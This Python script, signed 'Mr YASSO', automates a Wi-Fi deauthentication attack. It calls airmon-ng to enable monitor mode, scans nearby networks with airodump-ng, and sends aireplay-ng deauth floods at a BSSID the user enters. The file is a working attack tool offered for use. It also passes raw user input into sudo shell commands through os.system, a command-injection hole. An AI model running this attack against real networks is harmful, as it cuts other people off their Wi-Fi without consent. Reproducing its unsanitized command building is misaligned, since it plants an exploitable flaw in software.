#Mr YASSO  
import socket  
import os#you can use this tool for capturing network handshakes while listening to the network on another window
from time import sleep#i just imported time module to let the user read the information and understand it more 
print(''' __  __       __   __                  
|  \/  |_ __  \ \ / /_ _ ___ ___  ___  
| |\/| | '__|  \ V / _` / __/ __|/ _ \ 
| |  | | |      | | (_| \__ \__ \ (_) |
|_|  |_|_|      |_|\__,_|___/___/\___/ 
                                       ''')
user_hostname=socket.gethostname()
print('this is a letter from Mr Yasso to you ;\nhi MR {}'.format(user_hostname)+'\nAdvice:Dont do something stupid that can get you in trouble ..("/)' )
sleep(10)
os.system('clear')
print('[+]-enabling monitor mode ....')
sleep(3)
os.system('sudo airmon-ng start wlan0')
print('[+]-monitor mode enabled .....')
sleep(3)
os.system('clear')
print(''' _             _     _       _                             
| |__  ___ ___(_) __| |   __| |___  ___ _____   _____ _ __ 
| '_ \/ __/ __| |/ _` |  / _` / __|/ __/ _ \ \ / / _ \ '__|
| |_) \__ \__ \ | (_| | | (_| \__ \ (_| (_) \ V /  __/ |   
|_.__/|___/___/_|\__,_|  \__,_|___/\___\___/ \_/ \___|_|   \n\n''')
second=input('[+]- do you want to do a quick scan to the near networs and discover them ?[Y/N]\n[!]- dont forget to stop the scan with (ctrl+c)\n\nAllow? >>>  ')
if second=='y'or second=='Y':#to discover networks bssid,essid,channels,becons
    
    print('[!] dont forget to press Ctrl+c to stop !!!')
    sleep(2)
    os.system('sudo airodump-ng wlan0mon')
    
else:
    print('[+]- passing the scan.... ')
    pass 
print('\n\n')
bssid=input('example of network bssid[nn:nn:nn:nn:nn] \n\nenter the bssid of your target network : ')
deauth=input('\nenter the number of deauthication example[30]: ')

try:
    channel=input('[+]- enter the channel if is possible if you dont know the channel enter [pass]\n[+]-Enter the channel ===> ')
    if channel=='pass' or channel=='pas':
        pass
    else:
        set_channel=('sudo iwconfig wlan0mon channel '+channel)
        os.system(set_channel)
        print('[+]- wlan0mon was set on{channel',channel,' }')
except:
    print('[!]-passing the channel..... ')
os.system('clear')
print('''____   ___   ___   ___   ___  __  __   _ 
| __ ) / _ \ / _ \ / _ \ / _ \|  \/  | | |
|  _ \| | | | | | | | | | | | | |\/| | | |
| |_) | |_| | |_| | |_| | |_| | |  | | |_|
|____/ \___/ \___/ \___/ \___/|_|  |_| (_)
                   ''')
try:
    
    comand=('sudo aireplay-ng --deauth '+deauth+' -a '+bssid+' wlan0mon')
    print('[+]-starting the deauthication on the network....\n[!]-attack is running ....')
    sleep(2)
    os.system(comand)
    print('[*] attack complete .....')
except:
    print('[-]- you entered a wrong channel dont say i didnt worn you .....')
finally:
    
    print('[+]- stopping monitor mode.....')
    sleep(3)
    os.system('sudo airmon-ng stop wlan0mon')
    os.system('clear')













































































